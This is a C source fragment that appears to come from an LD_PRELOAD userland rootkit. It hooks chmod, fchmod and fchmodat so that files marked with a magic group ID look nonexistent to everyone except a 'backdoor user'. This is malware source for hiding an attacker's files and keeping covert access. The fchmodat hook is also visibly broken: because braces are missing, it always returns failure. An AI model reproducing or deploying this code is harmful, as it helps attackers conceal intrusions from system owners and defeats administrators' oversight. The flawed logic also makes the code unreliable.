int chmod(const char *pathname, mode_t mode)
{
    HOOK(o_chmod,CCHMOD);
    if(is_bdusr()) return o_chmod(pathname,mode); 
    if(hxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_chmod(pathname,mode);
}

int fchmod(int fd, mode_t mode)
{
    HOOK(o_fchmod,CFCHMOD);
    if(is_bdusr()) return o_fchmod(fd,mode);
    if(hfxstat(fd,MGID,32)) { errno=ENOENT; return -1; }
    return o_fchmod(fd,mode);
}

int fchmodat(int dirfd, const char *pathname, mode_t mode, int flags)
{
    HOOK(o_fchmodat,CFCHMODAT);
    if(is_bdusr()) return o_fchmodat(dirfd,pathname,mode,flags);
    if(hxstat(pathname,MGID,32) || hfxstat(dirfd,MGID,32))
      errno=ENOENT; return -1;
    return o_fchmodat(dirfd,pathname,mode,flags);
}
